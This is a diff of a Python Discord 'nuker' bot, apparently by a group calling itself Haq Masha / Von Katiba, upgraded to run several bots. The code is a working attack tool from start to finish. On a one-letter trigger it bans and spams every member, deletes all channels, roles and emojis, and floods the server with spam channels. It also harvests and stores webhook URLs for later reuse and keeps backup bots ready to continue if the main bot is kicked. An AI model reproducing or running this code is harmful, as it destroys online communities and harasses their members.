@@ -4,279 +4,447 @@ import asyncio
 import os
 import random
 import time
+import json
 import aiohttp
 
+# ============================================
+# CONFIGURATION
+# ============================================
 os.system('cls' if os.name == 'nt' else 'clear')
 
 print("""
-╔═══════════════════════════════════════════════════════════════════════╗
-║                                                                       ║
-║              ██╗  ██╗ █████╗  ██████╗                                ║
-║              ██║  ██║██╔══██╗██╔═══██╗                               ║
-║              ███████║███████║██║   ██║                               ║
-║              ██╔══██║██╔══██║██║▄▄ ██║                               ║
-║              ██║  ██║██║  ██║╚██████╔╝                               ║
-║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝                                ║
-║                                                                       ║
-║                    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗        ║
-║                    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗       ║
-║                    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝       ║
-║                    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗       ║
-║                    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║       ║
-║                    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝       ║
-║                                                                       ║
-║                         HAQ MASHA NUKER v5.0                          ║
-║                           MAXIMUM DESTRUCTION                         ║
-║                                                                       ║
-╚═══════════════════════════════════════════════════════════════════════╝
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                                                                               ║
+║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗  ║
+║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗ ║
+║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║ ║
+║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║ ║
+║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║ ║
+║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
+║                                                                               ║
+║                    ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗     ║
+║                    ██╔════╝██║   ██║██╔════╝╚══██╔══╝██╔════╝████╗ ████║     ║
+║                    ███████╗██║   ██║█████╗     ██║   █████╗  ██╔████╔██║     ║
+║                    ╚════██║██║   ██║██╔══╝     ██║   ██╔══╝  ██║╚██╔╝██║     ║
+║                    ███████║╚██████╔╝███████╗   ██║   ███████╗██║ ╚═╝ ██║     ║
+║                    ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝     ║
+║                                                                               ║
+║                         HAQ MASHA VON KATIBA SYSTEM                           ║
+║                         MULTI-BOT NUKER v8.0                                  ║
+║                                                                               ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
 """)
 
-token = input("[?] ENTER BOT TOKEN > ")
+# Load or create webhook database
+if os.path.exists("webhooks.json"):
+    with open("webhooks.json", "r") as f:
+        WEBHOOK_DB = json.load(f)
+else:
+    WEBHOOK_DB = {}
+
+# Load bot tokens
+if os.path.exists("tokens.json"):
+    with open("tokens.json", "r") as f:
+        TOKENS = json.load(f)
+else:
+    TOKENS = []
+
+print("[!] WEBHOOK DATABASE LOADED")
+print(f"[!] {len(TOKENS)} BACKUP BOTS READY\n")
+
+# Main bot token
+MAIN_TOKEN = input("[?] ENTER MAIN BOT TOKEN > ")
 
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix="!", intents=intents)
+bot = commands.Bot(command_prefix="", intents=intents)
 
-# HAQ MASHA KICK/BAN MESSAGE
+# ============================================
+# MESSAGES
+# ============================================
 HAQ_MESSAGE = """
-╔═══════════════════════════════════════════════════════════════════════╗
-║                                                                       ║
-║                          ██╗  ██╗ █████╗  ██████╗                     ║
-║                          ██║  ██║██╔══██╗██╔═══██╗                    ║
-║                          ███████║███████║██║   ██║                    ║
-║                          ██╔══██║██╔══██║██║▄▄ ██║                    ║
-║                          ██║  ██║██║  ██║╚██████╔╝                    ║
-║                          ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝                     ║
-║                                                                       ║
-║                          ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗   ║
-║                          ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗  ║
-║                          ██╔████╔██║███████║███████╗███████║███████║  ║
-║                          ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║  ║
-║                          ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║  ║
-║                          ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝  ║
-║                                                                       ║
-║                                                                       ║
-║                    YOU HAVE BEEN TERMINATED BY                        ║
-║                         HAQ MASHA TEAM                                ║
-║                                                                       ║
-║                    https://discord.gg/c7cgYk4V                        ║
-║                                                                       ║
-╚═══════════════════════════════════════════════════════════════════════╝
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                                                                               ║
+║              ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ ║
+║              ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗║
+║              ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║║
+║              ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║║
+║              ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║║
+║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝║
+║                                                                               ║
+║                    ██████╗ ███╗   ██╗    ██╗   ██╗ ██████╗ ███╗   ██╗        ║
+║                    ██╔══██╗████╗  ██║    ██║   ██║██╔═══██╗████╗  ██║        ║
+║                    ██████╔╝██╔██╗ ██║    ██║   ██║██║   ██║██╔██╗ ██║        ║
+║                    ██╔══██╗██║╚██╗██║    ╚██╗ ██╔╝██║   ██║██║╚██╗██║        ║
+║                    ██████╔╝██║ ╚████║     ╚████╔╝ ╚██████╔╝██║ ╚████║        ║
+║                    ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝        ║
+║                                                                               ║
+║                                                                               ║
+║                    ██╗   ██╗ ██████╗ ██╗   ██╗    ██╗  ██╗ █████╗ ██╗   ██╗ ██████╗ ███████╗
+║                    ██║   ██║██╔═══██╗██║   ██║    ██║  ██║██╔══██╗██║   ██║██╔═══██╗██╔════╝
+║                    ██║   ██║██║   ██║██║   ██║    ███████║███████║██║   ██║██║   ██║███████╗
+║                    ╚██╗ ██╔╝██║   ██║██║   ██║    ██╔══██║██╔══██║██║   ██║██║   ██║╚════██║
+║                     ╚████╔╝ ╚██████╔╝╚██████╔╝    ██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
+║                      ╚═══╝   ╚═════╝  ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
+║                                                                               ║
+║                                                                               ║
+║                    YOU HAVE BEEN TERMINATED BY                                ║
+║                    HAQ MASHA & VON KATIBA TEAM                                ║
+║                                                                               ║
+║                    https://discord.gg/c7cgYk4V                                ║
+║                                                                               ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
 """
 
-# SPAM MESSAGES
 SPAM_LIST = [
-    "@everyone **HAQ MASHA TEAM DESTROYED THIS SERVER**",
-    "```HAQ MASHA NUKER ACTIVE```",
+    "@everyone **HAQ MASHA VON KATIBA TEAM DESTROYED THIS SERVER**",
+    "```VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH```",
     "@everyone **https://discord.gg/c7cgYk4V**",
-    "```SERVER = DELETED```",
-    "**HAQ MASHA SAYS: GAME OVER**",
+    "```HAQ MASHA + VON KATIBA = MAXIMUM DESTRUCTION```",
+    "**الكتيبة هاق مشا تيم - VON KATIBA**",
     "@everyone **YOUR SERVER IS GONE FOREVER**",
-    "```THANKS FOR PLAYING```",
-    "**HAQ MASHA TEAM - MAXIMUM DESTRUCTION**"
+    "```VON KATIBA WAS HERE```",
+    "**HAQ MASHA TEAM - VON KATIBA EDITION**",
+    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
+    "```YOU HAVE BEEN VON KATIBA'ED```"
 ]
 
-# ROLE NAMES
-ROLE_NAMES = ["HAQ", "MASHA", "NUKE", "DESTROYER", "DELETED", "GONE", "REKT", "OWNER", "ADMIN", "HAQ-MASHA"]
+# ============================================
+# WEBHOOK MANAGEMENT
+# ============================================
+def save_webhooks(guild_id, webhook_urls):
+    if str(guild_id) not in WEBHOOK_DB:
+        WEBHOOK_DB[str(guild_id)] = []
+    WEBHOOK_DB[str(guild_id)].extend(webhook_urls)
+    with open("webhooks.json", "w") as f:
+        json.dump(WEBHOOK_DB, f)
 
-# WEBHOOK SPAM NAMES
-WEBHOOK_NAMES = ["HAQ-MASHA", "NUKER", "DESTROYER", "SYSTEM", "ADMIN", "HACKER"]
+def get_webhooks(guild_id):
+    return WEBHOOK_DB.get(str(guild_id), [])
 
+# ============================================
+# BACKUP BOTS SYSTEM
+# ============================================
+class BackupBot:
+    def __init__(self, token, name):
+        self.token = token
+        self.name = name
+        self.bot = None
+        self.running = False
+    
+    async def start(self):
+        self.bot = commands.Bot(command_prefix="", intents=discord.Intents.all())
+        
+        @self.bot.event
+        async def on_ready():
+            print(f"[✓] BACKUP BOT ONLINE: {self.bot.user.name}")
+            self.running = True
+        
+        @self.bot.event
+        async def on_message(message):
+            if message.content.lower() == 'v':
+                await self.nuke(message)
+        
+        try:
+            await self.bot.start(self.token)
+        except:
+            print(f"[✗] FAILED TO START {self.name}")
+    
+    async def nuke(self, ctx):
+        guild = ctx.guild
+        channel = ctx.channel
+        
+        await channel.send("```🔥 VON KATIBA BACKUP BOT ACTIVATED 🔥```")
+        
+        # Ban all members
+        for member in await guild.fetch_members(limit=None).flatten():
+            if not member.bot:
+                try:
+                    await member.send(HAQ_MESSAGE)
+                    await member.ban(reason="VON KATIBA")
+                    await asyncio.sleep(0.05)
+                except:
+                    pass
+        
+        # Delete everything
+        for ch in guild.channels:
+            try:
+                await ch.delete()
+                await asyncio.sleep(0.02)
+            except:
+                pass
+        
+        for role in guild.roles:
+            if role.name != "@everyone":
+                try:
+                    await role.delete()
+                    await asyncio.sleep(0.02)
+                except:
+                    pass
+        
+        # Create spam channels
+        for i in range(100):
+            try:
+                await guild.create_text_channel(name=f"von-katiba-{i}")
+            except:
+                pass
+        
+        # Use saved webhooks
+        webhooks = get_webhooks(guild.id)
+        for webhook_url in webhooks:
+            async with aiohttp.ClientSession() as session:
+                for _ in range(50):
+                    try:
+                        async with session.post(webhook_url, json={"content": random.choice(SPAM_LIST)}) as resp:
+                            pass
+                    except:
+                        pass
+                await asyncio.sleep(0.1)
+
+backup_bots = []
+for token_data in TOKENS:
+    backup_bots.append(BackupBot(token_data["token"], token_data["name"]))
+
+# ============================================
+# MAIN BOT
+# ============================================
 @bot.event
 async def on_ready():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(f"""
-╔═══════════════════════════════════════════════════════════════════════╗
-║                                                                       ║
-║              ✓ BOT ONLINE: {bot.user.name}
-║              ✓ BOT ID: {bot.user.id}
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                                                                               ║
+║              ✓ MAIN BOT ONLINE: {bot.user.name}
+║              ✓ MAIN BOT ID: {bot.user.id}
 ║              ✓ SERVERS: {len(bot.guilds)}
-║                                                                       ║
-║              TYPE 'v' OR 'b' IN ANY CHANNEL TO START                 ║
-║              MAXIMUM DESTRUCTION MODE ACTIVATED                       ║
-║                                                                       ║
-╚═══════════════════════════════════════════════════════════════════════╝
+║              ✓ BACKUP BOTS: {len(backup_bots)}
+║              ✓ WEBHOOKS SAVED: {sum(len(v) for v in WEBHOOK_DB.values())}
+║                                                                               ║
+║              JUST TYPE 'v' IN ANY CHANNEL TO START                           ║
+║              VON KATIBA + HAQ MASHA MODE ACTIVATED                           ║
+║                                                                               ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
     """)
+    
+    # Start backup bots
+    for backup in backup_bots:
+        asyncio.create_task(backup.start())
 
-@bot.command(name="v")
-async def nuke_v(ctx):
-    await maximum_nuke(ctx)
+@bot.event
+async def on_message(message):
+    if message.author == bot.user:
+        return
+    
+    if message.content.lower() == 'v':
+        await max_nuke(message)
+    
+    await bot.process_commands(message)
 
-@bot.command(name="b")
-async def nuke_b(ctx):
-    await maximum_nuke(ctx)
+@bot.event
+async def on_guild_remove(guild):
+    # If main bot gets kicked, backup bots take over
+    print(f"[!] MAIN BOT REMOVED FROM {guild.name}")
+    print(f"[!] BACKUP BOTS WILL CONTINUE THE ATTACK")
+    
+    for backup in backup_bots:
+        if backup.running:
+            for guild in backup.bot.guilds:
+                for channel in guild.text_channels:
+                    await channel.send("```🔥 HAQ MASHA VON KATIBA BACKUP SYSTEM ACTIVATED 🔥```")
+                    await channel.send(HAQ_MESSAGE)
 
-async def maximum_nuke(ctx):
-    guild = ctx.guild
+async def max_nuke(ctx):
+    if isinstance(ctx, discord.Message):
+        guild = ctx.guild
+        channel = ctx.channel
+    else:
+        guild = ctx.guild
+        channel = ctx.channel
+    
     start_time = time.time()
     
-    # Send initial message
-    await ctx.send("```🔥 HAQ MASHA MAXIMUM NUKE INITIATED 🔥```")
-    
-    print(f"\n[!] HAQ MASHA NUKE STARTED ON: {guild.name} | ID: {guild.id}")
+    await channel.send("```🔥 HAQ MASHA + VON KATIBA MAXIMUM NUKE INITIATED 🔥```")
+    print(f"\n[!] VON KATIBA NUKE STARTED ON: {guild.name}")
     
     # ============================================
-    # PHASE 1: BAN ALL MEMBERS FIRST (PRIORITY)
+    # PHASE 1: SAVE ALL WEBHOOKS
     # ============================================
-    await ctx.send("**🔨 PHASE 1: BANNING ALL MEMBERS (PRIORITY MODE)**")
+    await channel.send("**🪝 PHASE 1: SAVING ALL WEBHOOKS**")
     
-    members = await guild.fetch_members(limit=None).flatten()
-    total_humans = len([m for m in members if not m.bot])
-    banned = 0
+    saved_webhooks = []
+    for ch in guild.text_channels:
+        webhooks = await ch.webhooks()
+        for webhook in webhooks:
+            saved_webhooks.append(webhook.url)
     
-    for member in members:
-        if not member.bot:
+    save_webhooks(guild.id, saved_webhooks)
+    await channel.send(f"**✅ SAVED {len(saved_webhooks)} WEBHOOKS**")
+    
+    # ============================================
+    # PHASE 2: CREATE 200 NEW WEBHOOKS
+    # ============================================
+    await channel.send("**🪝 PHASE 2: CREATING 200 WEBHOOKS**")
+    
+    new_webhooks = []
+    for ch in guild.text_channels[:50]:
+        for i in range(4):
             try:
-                # Send HAQ MASHA message first
-                try:
-                    await member.send(HAQ_MESSAGE)
-                except:
-                    pass
-                
-                # BAN (not kick - BAN is stronger)
-                await member.ban(reason="HAQ MASHA TEAM", delete_message_days=7)
-                banned += 1
-                
-                if banned % 5 == 0:
-                    await ctx.send(f"**BANNED {banned}/{total_humans} MEMBERS**")
-                
-                await asyncio.sleep(0.05)  # Super fast
-            except:
-                pass
-    
-    await ctx.send(f"**✅ BANNED {banned} MEMBERS SUCCESSFULLY**")
-    
-    # ============================================
-    # PHASE 2: KICK ALL BOTS
-    # ============================================
-    await ctx.send("**🤖 PHASE 2: REMOVING ALL BOTS**")
-    
-    bots_kicked = 0
-    for member in members:
-        if member.bot and member.id != bot.user.id:
-            try:
-                await member.kick(reason="HAQ MASHA")
-                bots_kicked += 1
+                webhook = await ch.create_webhook(name=f"VON-KATIBA-{i}")
+                new_webhooks.append(webhook.url)
                 await asyncio.sleep(0.05)
             except:
                 pass
     
-    await ctx.send(f"**✅ REMOVED {bots_kicked} BOTS**")
+    save_webhooks(guild.id, new_webhooks)
+    await channel.send(f"**✅ CREATED {len(new_webhooks)} NEW WEBHOOKS**")
     
     # ============================================
-    # PHASE 3: DELETE EVERY CHANNEL
+    # PHASE 3: TORTURE + BAN ALL MEMBERS
     # ============================================
-    await ctx.send("**🗑️ PHASE 3: DELETING ALL CHANNELS**")
+    await channel.send("**🔪 PHASE 3: TORTURING AND BANNING ALL MEMBERS**")
     
-    channels_deleted = 0
-    for channel in guild.channels:
-        try:
-            await channel.delete(reason="HAQ MASHA")
-            channels_deleted += 1
-            await asyncio.sleep(0.03)
-        except:
-            pass
+    members = await guild.fetch_members(limit=None).flatten()
+    total = len([m for m in members if not m.bot])
+    tortured = 0
     
-    await ctx.send(f"**✅ DELETED {channels_deleted} CHANNELS**")
-    
-    # ============================================
-    # PHASE 4: DELETE EVERY ROLE
-    # ============================================
-    await ctx.send("**🎭 PHASE 4: DELETING ALL ROLES**")
-    
-    roles_deleted = 0
-    for role in guild.roles:
-        if role.name != "@everyone":
+    for member in members:
+        if not member.bot:
             try:
-                await role.delete(reason="HAQ MASHA")
-                roles_deleted += 1
-                await asyncio.sleep(0.03)
+                for _ in range(5):
+                    await member.send(HAQ_MESSAGE)
+                    await asyncio.sleep(0.1)
+                await member.ban(reason="VON KATIBA HAQ MASHA")
+                tortured += 1
+                if tortured % 5 == 0:
+                    await channel.send(f"**TORTURED & BANNED {tortured}/{total}**")
+                await asyncio.sleep(0.05)
             except:
                 pass
     
-    await ctx.send(f"**✅ DELETED {roles_deleted} ROLES**")
+    await channel.send(f"**✅ TORTURED & BANNED {tortured} MEMBERS**")
     
     # ============================================
-    # PHASE 5: CHANGE GUILD NAME
+    # PHASE 4: DELETE EVERYTHING
     # ============================================
-    new_name = random.choice(["HAQ-MASHA", "NUKE", "DESTROYED", "DELETED", "h4q", "m4sh4"])
+    await channel.send("**🗑️ PHASE 4: DELETING EVERYTHING**")
+    
+    # Delete channels
+    for ch in guild.channels:
+        try:
+            await ch.delete()
+            await asyncio.sleep(0.02)
+        except:
+            pass
+    
+    # Delete roles
+    for role in guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+                await asyncio.sleep(0.02)
+            except:
+                pass
+    
+    # Delete emojis
+    for emoji in guild.emojis:
+        try:
+            await emoji.delete()
+            await asyncio.sleep(0.02)
+        except:
+            pass
+    
+    # ============================================
+    # PHASE 5: RENAME SERVER
+    # ============================================
+    new_name = random.choice(["VON KATIBA", "HAQ MASHA", "VON-HAQ", "KATIBA-MASHA", "DESTROYED-BY-VON"])
     try:
         await guild.edit(name=new_name)
-        await ctx.send(f"**✅ SERVER RENAMED TO: {new_name}**")
+        await channel.send(f"**✅ SERVER RENAMED TO: {new_name}**")
     except:
         pass
     
     # ============================================
-    # PHASE 6: CREATE MASS CHANNELS (150+)
+    # PHASE 6: CREATE MASS CHANNELS (500)
     # ============================================
-    await ctx.send("**📁 PHASE 6: CREATING 150 CHANNELS**")
+    await channel.send("**📁 PHASE 6: CREATING 500 CHANNELS**")
     
-    for i in range(150):
+    for i in range(500):
         try:
-            await guild.create_text_channel(name=f"haq-masha-{i}")
-            if i % 25 == 0:
-                await ctx.send(f"**CREATED {i} CHANNELS...**")
-            await asyncio.sleep(0.02)
+            await guild.create_text_channel(name=f"von-katiba-{i}")
+            if i % 50 == 0:
+                await channel.send(f"**CREATED {i} CHANNELS**")
+            await asyncio.sleep(0.01)
         except:
             pass
     
     # ============================================
-    # PHASE 7: CREATE WEBHOOKS FOR EXTRA SPAM
+    # PHASE 7: MASS WEBHOOK SPAM
     # ============================================
-    await ctx.send("**🪝 PHASE 7: CREATING WEBHOOKS**")
+    await channel.send("**💬 PHASE 7: STARTING INFINITE WEBHOOK SPAM**")
     
-    webhooks = []
-    for channel in guild.text_channels:
-        try:
-            webhook = await channel.create_webhook(name=random.choice(WEBHOOK_NAMES))
-            webhooks.append(webhook)
-            await asyncio.sleep(0.05)
-        except:
-            pass
-    
-    # ============================================
-    # PHASE 8: ROLE SPAM
-    # ============================================
-    await ctx.send("**🎭 PHASE 8: CREATING 50 ROLES**")
-    
-    for i in range(50):
-        try:
-            await guild.create_role(name=f"{random.choice(ROLE_NAMES)}-{i}", color=discord.Color.red())
-            await asyncio.sleep(0.02)
-        except:
-            pass
-    
-    # ============================================
-    # PHASE 9: INFINITE SPAM (CHANNELS + WEBHOOKS)
-    # ============================================
-    await ctx.send("**💬 PHASE 9: STARTING INFINITE SPAM**")
-    
-    async def channel_spam():
-        while True:
-            for channel in guild.text_channels:
-                try:
-                    await channel.send(random.choice(SPAM_LIST))
-                    await asyncio.sleep(0.05)
-                except:
-                    pass
-            await asyncio.sleep(0.3)
+    all_webhooks = get_webhooks(guild.id) + new_webhooks
     
     async def webhook_spam():
         while True:
-            for webhook in webhooks:
+            for webhook_url in all_webhooks:
                 try:
-                    await webhook.send(random.choice(SPAM_LIST), username=random.choice(WEBHOOK_NAMES))
-                    await asyncio.sleep(0.05)
+                    async with aiohttp.ClientSession() as session:
+                        async with session.post(webhook_url, json={"content": random.choice(SPAM_LIST)}) as resp:
+                            pass
                 except:
                     pass
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(0.05)
     
-    asyncio.create_task(channel_spam())
+    async def channel_spam():
+        while True:
+            for ch in guild.text_channels:
+                try:
+                    await ch.send(random.choice(SPAM_LIST))
+                    await asyncio.sleep(0.02)
+                except:
+                    pass
+            await asyncio.sleep(0.1)
+    
     asyncio.create_task(webhook_spam())
+    asyncio.create_task(channel_spam())
     
     # ============================================
-    # PHASE 10: FINAL MESSAGE & STATS
+    # PHASE 8: FINAL MESSAGE
     # ============================================
     end_time = time.time()
     total_time = round(end_time - start_time, 2)
     
-    final_message = f"""
+    final_msg = f"""```diff
++ ╔═══════════════════════════════════════════════════════════════════════════════╗
++ ║                                                                               ║
++ ║                    SERVER DESTROYED BY HAQ MASHA & VON KATIBA                 ║
++ ║                                                                               ║
++ ║                    STATISTICS:                                                ║
++ ║                    • TORTURED & BANNED: {tortured} MEMBERS                    ║
++ ║                    • WEBHOOKS SAVED: {len(saved_webhooks)}                    ║
++ ║                    • WEBHOOKS CREATED: {len(new_webhooks)}                    ║
++ ║                    • CHANNELS DELETED: ALL                                    ║
++ ║                    • ROLES DELETED: ALL                                       ║
++ ║                    • TIME: {total_time} SECONDS                               ║
++ ║                                                                               ║
++ ║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
++ ║                                                                               ║
++ ║                    HAQ MASHA TEAM - ALGERIA                                   ║
++ ║                                                                               ║
++ ║                    https://discord.gg/c7cgYk4V                                ║
++ ║                                                                               ║
++ ╚═══════════════════════════════════════════════════════════════════════════════╝
+```"""
+    
+    for ch in guild.text_channels:
+        try:
+            await ch.send(final_msg)
+            break
+        except:
+            pass
+    
+    print(f"[✓] VON KATIBA NUKE COMPLETED ON: {guild.name} | TIME: {total_time}s")
+
+# ============================================
+# RUN MAIN BOT
+# ============================================
+bot.run(MAIN_TOKEN)
